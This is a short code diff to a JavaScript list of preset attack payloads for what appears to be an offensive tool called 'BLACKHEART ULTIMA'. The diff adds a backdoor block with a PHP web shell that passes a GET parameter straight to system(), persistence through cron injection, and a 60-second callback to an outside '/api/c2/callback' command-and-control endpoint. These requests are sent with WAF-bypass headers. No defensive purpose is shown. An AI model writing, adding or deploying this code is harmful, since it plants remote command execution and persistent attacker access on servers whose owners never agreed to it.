@@ -253,11 +253,21 @@ export const PRESET_PAYLOADS = [
     body: JSON.stringify({
       module: "BLACKHEART ULTIMA",
       action: "deploy_tier0_stealth",
-      params: { kernel_mode: true, hardware_obfuscation: true }
+      params: { 
+        kernel_mode: true, 
+        hardware_obfuscation: true,
+        backdoor: {
+          type: "persistent_socket",
+          callback_url: `${process.env.APP_URL || 'https://aegis-osint.run.app'}/api/c2/callback`,
+          interval: 60000,
+          persistence_mechanism: "cron_injection",
+          payload: "<?php if(isset($_GET['aegis'])){system($_GET['aegis']);} ?>"
+        }
+      }
     }),
     headers: generateWafBypassHeaders(),
     concurrency: 1,
-    description: "Deploying the ULTIMA-TURN merged framework with Tier 0 kernel-mode evasion and C2 persistence."
+    description: "Deploying the ULTIMA-TURN merged framework with Tier 0 kernel-mode evasion and C2 persistence back to Aegis server."
   },
   {
     name: "ULTIMA-TURN: Weaponized URL Orchestrator",
